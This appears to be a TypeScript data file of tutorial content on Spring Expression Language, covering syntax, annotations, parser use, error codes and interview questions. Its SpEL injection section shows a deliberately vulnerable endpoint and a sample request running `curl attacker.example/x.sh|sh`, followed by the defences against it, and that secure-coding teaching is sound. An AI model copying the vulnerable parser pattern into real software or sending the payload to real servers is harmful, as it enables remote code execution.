import { Topic } from '../coreJava';

export const springExpressionLanguageSpel: Topic = {
    id: 'sb-spring-expression-language-spel',
    name: "Spring Expression Language (SpEL)",
    beginner: [
        {
            content: `<h3>A Small Language Evaluated at Runtime</h3>
SpEL is an expression language built into <code>spring-expression</code>. It lets a <em>string</em> express a computation - reading a property, calling a method, comparing values - which Spring evaluates when it needs the answer.<br><br>

You have already used it without naming it. It is what makes these work:<br><br>

<table>
<tr><th>Where</th><th>Example</th></tr>
<tr><td><code>@Value</code></td><td><code>@Value("#{systemProperties['user.region']}")</code></td></tr>
<tr><td>Spring Security</td><td><code>@PreAuthorize("hasRole('ADMIN') and #id == principal.id")</code></td></tr>
<tr><td>Caching</td><td><code>@Cacheable(key = "#customerId + ':' + #year")</code></td></tr>
<tr><td>Conditional config</td><td><code>@ConditionalOnExpression("\${shop.enabled} and \${shop.region} == 'eu'")</code></td></tr>
<tr><td>Spring Data</td><td><code>@Query("select o from Order o where o.tenant = :#{principal.tenant}")</code></td></tr>
</table>`
        },
        {
            content: `<h3><code>#{ }</code> and <code>\${ }</code> Are Not the Same Thing</h3>
This is the distinction that causes the most confusion, and they are frequently written side by side.<br><br>

<table>
<tr><th></th><th><code>\${ }</code></th><th><code>#{ }</code></th></tr>
<tr><td>Is</td><td>A <strong>property placeholder</strong></td><td>A <strong>SpEL expression</strong></td></tr>
<tr><td>Resolved by</td><td><code>PropertySourcesPlaceholderConfigurer</code></td><td>The SpEL engine</td></tr>
<tr><td>Reads</td><td><code>Environment</code> - files, env vars, CLI</td><td>Beans, methods, operators, literals</td></tr>
<tr><td>Can compute</td><td>No - substitution only</td><td>Yes</td></tr>
<tr><td>Order</td><td colspan="2"><code>\${ }</code> is resolved <strong>first</strong>, then the result is parsed as SpEL</td></tr>
</table>`,
            codeExamples: [
                `// Substitution - reads the value, nothing more.
@Value("\${app.timeout}")
private Duration timeout;

// Computation - the value is calculated.
@Value("#{2 * 60}")
private int seconds;                          // 120

// Both together, and this is where the ordering matters:
@Value("#{\${app.pool-size} * 2}")
private int maxConnections;

// Step 1: \${app.pool-size} is substituted     -> "#{10 * 2}"
// Step 2: the SpEL engine evaluates it        -> 20

// A default value, which only \${ } supports:
@Value("\${app.timeout:5s}")                  // 5s if unset

// The SpEL equivalent of a default is the Elvis operator:
@Value("#{systemProperties['app.mode'] ?: 'standard'}")`
            ]
        },
        {
            content: `<h3>The Syntax Worth Knowing</h3>
You will read far more SpEL than you write, so recognition matters more than fluency.<br><br>

<table>
<tr><th>Feature</th><th>Example</th><th>Result</th></tr>
<tr><td>Literals</td><td><code>#{'hello'}</code>, <code>#{42}</code>, <code>#{true}</code>, <code>#{null}</code></td><td>as written</td></tr>
<tr><td>Arithmetic</td><td><code>#{2 + 3 * 4}</code></td><td><code>14</code></td></tr>
<tr><td>Comparison</td><td><code>#{count > 5}</code>, <code>#{name == 'x'}</code></td><td>boolean</td></tr>
<tr><td>Logical</td><td><code>#{a and b}</code>, <code>#{!flag}</code>, <code>#{a or b}</code></td><td>boolean</td></tr>
<tr><td>Ternary</td><td><code>#{count > 0 ? 'some' : 'none'}</code></td><td>either branch</td></tr>
<tr><td>Elvis</td><td><code>#{name ?: 'unknown'}</code></td><td>left, or right if null</td></tr>
<tr><td>Safe navigation</td><td><code>#{customer?.address?.city}</code></td><td><code>null</code> instead of NPE</td></tr>
<tr><td>Bean reference</td><td><code>#{@orderService.count()}</code></td><td>calls the bean</td></tr>
<tr><td>Type reference</td><td><code>#{T(java.lang.Math).PI}</code></td><td>static access</td></tr>
<tr><td>Collection selection</td><td><code>#{orders.?[total > 100]}</code></td><td>matching subset</td></tr>
<tr><td>Collection projection</td><td><code>#{orders.![reference]}</code></td><td>list of one field</td></tr>
</table>`,
            codeExamples: [
                `@Component
public class ShopConfig {

    // Reading another bean's property
    @Value("#{shopProperties.region}")
    private String region;

    // Calling a method on another bean
    @Value("#{@currencyService.defaultCurrency()}")
    private Currency currency;

    // A static method or constant
    @Value("#{T(java.time.ZoneId).of('Europe/London')}")
    private ZoneId zone;

    // Environment access without \${ }
    @Value("#{systemEnvironment['HOSTNAME'] ?: 'local'}")
    private String hostname;

    // Splitting a property into a list - a genuinely common one
    @Value("#{'\${shop.regions}'.split(',')}")
    private List<String> regions;
    // shop.regions=eu,us,apac  ->  ["eu", "us", "apac"]
    //
    // Note the quotes around \${shop.regions}: after substitution the
    // expression must be VALID SpEL, and eu,us,apac is not - it has to
    // become the string literal 'eu,us,apac' before .split() applies.
    // Omitting them gives:
    //   SpelParseException: EL1041E: After parsing a valid expression,
    //   there is still more data: ','`
            ]
        },
        {
            content: `<h3>Where It Actually Earns Its Place</h3>
SpEL is a poor general-purpose tool - it is untyped, unrefactorable and only checked at runtime. It is worth using in the places where the alternative is worse.<br><br>

<table>
<tr><th>Use</th><th>Why SpEL wins</th></tr>
<tr><td><strong>Method security</strong> - <code>@PreAuthorize</code></td><td>The rule must reference method arguments and the current principal, neither of which exists at compile time.</td></tr>
<tr><td><strong>Cache keys</strong> - <code>@Cacheable</code></td><td>The key is derived from arguments; a custom <code>KeyGenerator</code> for every method would be far more code.</td></tr>
<tr><td><strong>Conditional beans</strong> - <code>@ConditionalOnExpression</code></td><td>Registration depends on a combination of properties that a single <code>@ConditionalOnProperty</code> cannot express.</td></tr>
</table>`,
            codeExamples: [
                `// Method security - #id is the method PARAMETER.
@PreAuthorize("hasRole('ADMIN') or #order.customerId == principal.id")
public Order update(Order order) { ... }

// #p0 / #a0 also work positionally, but named parameters need
// -parameters at compile time (Spring Boot's Maven plugin sets it).


// Cache keys built from arguments:
@Cacheable(value = "reports", key = "#customerId + ':' + #year")
public Report monthly(Long customerId, int year) { ... }

// Conditional caching - only cache results worth caching:
@Cacheable(value = "orders", condition = "#id > 0",
                             unless = "#result == null")
public Order find(Long id) { ... }
// condition: evaluated BEFORE the call, on arguments
// unless:    evaluated AFTER, and #result is available


// Bean registration on a combination of properties:
@Bean
@ConditionalOnExpression("\${shop.cache.enabled:true} and '\${shop.region}' == 'eu'")
public CacheManager euCacheManager() { ... }
// Note the quotes around the string property - the same rule as above.`
            ]
        }
    ],
    expert: [
        {
            content: `<h3>Using the Parser Directly</h3>
Occasionally useful for a rules engine, a user-configurable filter, or a templating feature.<br>`,
            codeExamples: [
                `ExpressionParser parser = new SpelExpressionParser();

// Against a root object:
Order order = new Order("A-1", Money.of(150));

Expression exp = parser.parseExpression("total.amount > 100");
boolean big = exp.getValue(order, Boolean.class);        // true

// With named variables:
StandardEvaluationContext context = new StandardEvaluationContext(order);
context.setVariable("threshold", 100);
parser.parseExpression("total.amount > #threshold")
      .getValue(context, Boolean.class);                 // true

// PARSE ONCE, EVALUATE MANY. Parsing builds an AST and is by far the
// expensive half:
private static final Expression RULE =
    new SpelExpressionParser().parseExpression("total.amount > 100");
// then RULE.getValue(order, Boolean.class) per call.

// For hot paths, compile the expression to bytecode:
SpelParserConfiguration config = new SpelParserConfiguration(
    SpelCompilerMode.IMMEDIATE, ShopRules.class.getClassLoader());
ExpressionParser fast = new SpelExpressionParser(config);
// Compilation only works when the types seen during evaluation are
// stable - a polymorphic root object silently falls back to
// interpretation.`
            ]
        },
        {
            content: `<h3>SpEL Injection Is Remote Code Execution</h3>
This is the most important thing on the page. SpEL can instantiate classes and call arbitrary static methods. <strong>An expression built from user input is an RCE vulnerability</strong>, not merely a bug.<br>`,
            codeExamples: [
                `// CATASTROPHIC - never write this.
@GetMapping("/search")
public List<Order> search(@RequestParam String filter) {
    Expression exp = new SpelExpressionParser().parseExpression(filter);
    return orders.stream()
                 .filter(o -> exp.getValue(o, Boolean.class))
                 .toList();
}

// A request of:
//   /search?filter=T(java.lang.Runtime).getRuntime().exec('curl attacker.example/x.sh|sh')
//
// runs that command as the application user. T() reaches any class on
// the classpath, and new ProcessBuilder(...) is equally available.
//
// This is a real and repeatedly exploited class of vulnerability -
// several published Spring CVEs are SpEL injection through a value
// that reached an expression parser.`,
                `// If expressions from configuration or users are genuinely required,
// use the RESTRICTED context. SimpleEvaluationContext removes T(),
// constructors, and bean references.

ExpressionParser parser = new SpelExpressionParser();

EvaluationContext safe = SimpleEvaluationContext
        .forReadOnlyDataBinding()          // property reads only
        .build();

parser.parseExpression("total.amount > 100").getValue(safe, order);   // OK
parser.parseExpression("T(java.lang.Runtime)").getValue(safe, order);
// -> SpelEvaluationException: EL1005E: Type cannot be found
//    'java.lang.Runtime'

// The two contexts, and when each is right:
//
//   StandardEvaluationContext  full power - T(), new, @beanName.
//                              ONLY for expressions YOU wrote.
//
//   SimpleEvaluationContext    property access and simple operators.
//                              For anything influenced by input.
//                              forReadOnlyDataBinding() is stricter
//                              than forPropertyAccessors().
//
// Additional defences when accepting expressions at all:
//   * allow-list the permitted property names, do not blocklist syntax
//   * cap expression length
//   * evaluate with a timeout on a bounded thread
//
// The safest design remains: do not accept expressions. A fixed set of
// named filters covers nearly every real requirement.`
            ]
        },
        {
            content: `<h3>Failure Modes and Their Messages</h3>
SpEL errors are runtime errors, and the codes are worth recognising because they say what went wrong precisely.<br><br>

<table>
<tr><th>Error</th><th>Cause</th></tr>
<tr><td><code>EL1008E: Property or field 'x' cannot be found</code></td><td>The name does not exist on the root object - or there is no public getter.</td></tr>
<tr><td><code>EL1007E: Property or field 'x' cannot be found on null</code></td><td>Something earlier in the chain was null. Use safe navigation <code>?.</code>.</td></tr>
<tr><td><code>EL1041E: After parsing a valid expression, there is still more data</code></td><td>A substituted <code>\${ }</code> value produced invalid SpEL - usually a missing pair of quotes.</td></tr>
<tr><td><code>EL1005E: Type cannot be found</code></td><td><code>T()</code> on an unknown class, or a restricted evaluation context.</td></tr>
<tr><td><code>Could not resolve placeholder 'x'</code></td><td>Not SpEL at all - a <code>\${ }</code> placeholder with no value and no default.</td></tr>
</table>`,
            codeExamples: [
                `// The failure that surprises people most: SpEL in @Value is
// evaluated when the BEAN is created, so a bean it references must
// already exist.

@Component
public class ReportService {
    @Value("#{@currencyService.defaultCurrency()}")
    private Currency currency;
}

// If currencyService is itself still being constructed, this is a
// circular dependency expressed through a string - and the error names
// the expression, not the cycle:
//
//   BeanCreationException: Error creating bean with name
//   'reportService': Injection of autowired dependencies failed;
//   nested exception is ... EL1004E: Method call: Attempted to call
//   method defaultCurrency() on null context object
//
// Take the bean as a constructor parameter instead. The dependency is
// then visible, ordered by the container, and checked by the compiler:

@Component
public class ReportService {
    private final Currency currency;

    public ReportService(CurrencyService currencies) {
        this.currency = currencies.defaultCurrency();
    }
}

// General rule: SpEL that references beans is configuration written as
// a string. Prefer real Java wherever the expression is not required
// to be dynamic.`
            ]
        },
        {
            content: `<h3>Interview Questions</h3>

<table>
<tr><th>Question</th><th>Answer</th></tr>
<tr><td>What is SpEL?</td><td>Spring's runtime expression language, in <code>spring-expression</code> - used by <code>@Value</code>, method security, cache annotations and conditional configuration.</td></tr>
<tr><td><code>\${ }</code> vs <code>#{ }</code>?</td><td><code>\${ }</code> is a property placeholder resolved from the <code>Environment</code>; <code>#{ }</code> is a SpEL expression that can compute. Placeholders resolve first, then the result is parsed as SpEL.</td></tr>
<tr><td>How do you give a default?</td><td><code>\${key:default}</code> for a placeholder, the Elvis operator <code>?:</code> in SpEL.</td></tr>
<tr><td>What is safe navigation?</td><td><code>?.</code> returns <code>null</code> instead of throwing when part of the chain is null.</td></tr>
<tr><td>Selection and projection?</td><td><code>.?[condition]</code> filters a collection; <code>.![expression]</code> maps it.</td></tr>
<tr><td>How do you reference a bean?</td><td><code>@beanName</code> inside an expression - <code>#{@orderService.count()}</code>.</td></tr>
<tr><td>Why is SpEL injection dangerous?</td><td><code>T()</code> and constructors reach any class on the classpath, so an expression built from user input is remote code execution.</td></tr>
<tr><td>How do you evaluate untrusted expressions safely?</td><td><code>SimpleEvaluationContext</code> instead of <code>StandardEvaluationContext</code> - it removes type references, constructors and bean access. Better still, do not accept expressions.</td></tr>
<tr><td>How do you make SpEL fast?</td><td>Parse once and reuse the <code>Expression</code>; optionally enable compiler mode, which requires stable types.</td></tr>
<tr><td>Why avoid SpEL that references beans in <code>@Value</code>?</td><td>It is wiring expressed as an unchecked string, evaluated during bean creation - so ordering problems surface as confusing expression errors. Use constructor injection.</td></tr>
</table>`
        }
    ]
};
